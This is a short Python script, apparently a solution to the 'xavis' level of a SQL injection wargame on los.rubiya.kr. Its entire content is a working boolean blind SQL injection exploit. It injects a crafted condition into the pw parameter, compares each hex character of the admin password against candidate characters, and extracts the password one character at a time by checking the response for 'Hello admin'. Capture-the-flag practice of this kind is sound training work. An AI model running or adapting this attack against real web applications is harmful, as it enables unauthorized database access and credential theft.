#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

pw=""

for i in range(1,25):
  for j in range(48,128): # 0~9, a~z, A~Z
    try:
      url="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=1' or id='admin' and substr(hex(pw)," + str(i) + ", 1) = \'" + chr(j)
      result = requests.post(url, cookies=(dict(PHPSESSID="세션값")))
    except:
      print("Error...")
      continue
    if 'Hello admin' in result.text:
      pw = pw + chr(j)
      print("pw : " + pw)
      break

